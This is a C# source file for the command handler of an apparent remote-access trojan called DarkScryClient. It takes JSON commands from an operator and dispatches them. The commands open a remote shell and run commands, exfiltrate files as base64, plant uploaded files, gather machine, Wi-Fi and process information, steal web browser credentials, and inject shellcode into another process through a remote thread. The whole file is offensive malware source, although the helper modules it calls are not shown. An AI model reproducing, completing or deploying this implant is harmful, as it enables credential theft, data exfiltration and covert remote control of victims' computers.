using DarkScryClient.Moduls.Collection;
using DarkScryClient.Moduls.Collection.Files;
using DarkScryClient.Moduls.Collection.Passwords;
using DarkScryClient.Utils;
using WebInfoGather;
using Injection;
using Utils;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text.Json;

namespace DarkScryClient.Client
{
	internal class CommandHandler : IDisposable
	{
		private readonly struct CommandIdentifiers
		{
			public const int START_SHELL_INSTANCE = 1;
			public const int RUN_COMMAND = 2;
			public const int GET_BASIC_MACHINE_INFO = 3;
			public const int SNAP_FULL_DIRECTORY = 4;
			public const int GET_FILE_BASE_64 = 5;
			public const int UPLOAD_FILE_BASE_64 = 6;
			public const int GET_WIFI_BASIC_INFO = 7;
			public const int FETCH_WEB_BROWSER_CREDENTIALS = 8;
			public const int ENUMERATE_PROCESSES = 9;
			public const int SHELLCODE_INJECTION_REMOTE_THREAD = 10;
		}

		private CSShellServicecs _CShellServicecs;

		public CommandHandler()
		{
			_CShellServicecs = null;
		}

		public byte[] RunCommand(string jsonCommand)
		{
			Console.WriteLine(jsonCommand);
			using var jsonDoc = JsonDocument.Parse(jsonCommand);
			var root = jsonDoc.RootElement;

			int action = root.GetProperty("action_id").GetInt32();
			var commandElement = root.GetProperty("command");
			Console.WriteLine($"Action: {action}");
			try
			{
				switch (action)
				{
					case CommandIdentifiers.START_SHELL_INSTANCE:
						if (!Config.IsMainShellRuning)
						{
							_CShellServicecs = new CSShellServicecs();
						}
						return PackAgentResponse(true, null, null);

					case CommandIdentifiers.RUN_COMMAND:
						if (!Config.IsMainShellRuning)
						{
							return PackAgentResponse(false, null, "Shell is not running");
						}

						string commandStr = commandElement.GetProperty("command").GetString();
						string output = _CShellServicecs.RunCommand(commandStr);

						return PackAgentResponse(true, new Dictionary<string, object>
						{
							{ "output", output }
						}, null);

					case CommandIdentifiers.GET_BASIC_MACHINE_INFO:
						var bmi = MachineInfo.BasicMachineInfoRetriever.GetBasicMachineInfo();
						return PackAgentResponse(true, new Dictionary<string, object>
						{
							{ "machine_info", bmi }
						}, null);

					case CommandIdentifiers.SNAP_FULL_DIRECTORY:
						string path = commandElement.TryGetProperty("path", out var pathProp) && !string.IsNullOrEmpty(pathProp.GetString())
							? pathProp.GetString()
							: Environment.CurrentDirectory;

						var filesAndDirs = FilesExplorer.GetFilesAndDirectories(path);
						return PackAgentResponse(true, new Dictionary<string, object>
						{
							{ "directory_snapshot", filesAndDirs }
						}, null);

					case CommandIdentifiers.GET_FILE_BASE_64:
						string filePath = commandElement.GetProperty("path").GetString();
						byte[] fileContent = File.ReadAllBytes(filePath);

						return PackAgentResponse(true, new Dictionary<string, object>
						{
							{ "file_base64", Convert.ToBase64String(fileContent) }
						}, null);

					case CommandIdentifiers.UPLOAD_FILE_BASE_64:
						string uploadPath = commandElement.GetProperty("path").GetString();
						string uploadFileName = commandElement.GetProperty("file_name").GetString();
						string uploadFileBase64 = commandElement.GetProperty("file_base64").GetString();

						File.WriteAllBytes(Path.Combine(uploadPath, uploadFileName), Convert.FromBase64String(uploadFileBase64));
						return PackAgentResponse(true, new Dictionary<string, object> { { "uploaded", true } }, null);

					case CommandIdentifiers.GET_WIFI_BASIC_INFO:
						var wifiProfiles = GatherWifiInfo.GetBasicWifiInfo();
						return PackAgentResponse(true, new Dictionary<string, object>
						{
							{ "wifi_profiles", wifiProfiles }
						}, null);

					case CommandIdentifiers.FETCH_WEB_BROWSER_CREDENTIALS:
						string credTypeString = commandElement.GetProperty("cred_type").GetString();

						if (Enum.TryParse(credTypeString, out WebCredentialCollector.CollectionType credType))
						{
							var credentials = WebCredentialCollector.GatherLoginData(credType);
							return PackAgentResponse(true, new Dictionary<string, object>
							{
								{ "credentials", credentials }
							}, null);
						}
						return PackAgentResponse(false, null, "Invalid credential type.");

					case CommandIdentifiers.ENUMERATE_PROCESSES:
						var processes = ProcessEnum.EnumProcesses();
						return PackAgentResponse(true, new Dictionary<string, object>
						{
							{ "processes", processes }
						}, null);

					case CommandIdentifiers.SHELLCODE_INJECTION_REMOTE_THREAD:
						byte[] shellcode = Convert.FromBase64String(commandElement.GetProperty("shellcode").GetString());
						int pid = commandElement.GetProperty("pid").GetInt32();

						bool success = RemoteThreadInjections.RemoteThreadShellcode(pid, shellcode);

						return PackAgentResponse(success, new Dictionary<string, object>
						{
							{ "injection_success", success }
						}, success ? null : "Injection failed");

					default:
						return PackAgentResponse(false, null, "Unknown Action.");
				}
			}
			catch (Exception ex)
			{
				return PackAgentResponse(false, null, $"Exception: {ex.Message}");
			}
		}

		private byte[] PackAgentResponse(bool success, Dictionary<string, object> data, string error)
		{
			var response = new
			{
				success,
				data,
				error
			};

			string jsonResponse = JsonSerializer.Serialize(response);

			Console.WriteLine("Sending response:");
			Console.WriteLine(jsonResponse);

			return Tools.StringToBytes(jsonResponse);
		}


		public void Dispose()
		{
			_CShellServicecs?.Dispose();
		}
	}
}
